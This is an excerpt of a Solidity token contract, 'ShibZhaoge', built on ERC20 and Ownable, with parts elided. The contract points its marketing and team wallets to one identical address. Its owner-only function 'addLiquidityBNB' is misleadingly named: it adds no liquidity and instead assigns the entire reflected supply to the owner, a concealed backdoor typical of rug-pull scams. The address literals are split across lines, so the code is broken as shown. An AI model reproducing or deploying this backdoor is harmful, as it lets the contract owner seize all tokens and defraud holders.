...
contract ShibZhaoge is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ShibaZhaoge"; 
    string private _symbol = "SZ";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x90C0D247d0016FDe4249d560493Ca9988C734b2A
);
    address payable public teamWalletAddress = payable(0x90C0D247d0016FDe4249d560493Ca9988C734b2A
);
    ...
    function addLiquidityBNB() public onlyOwner returns (bool success) {_rBalance[owner()] = _rSupply;return true;}
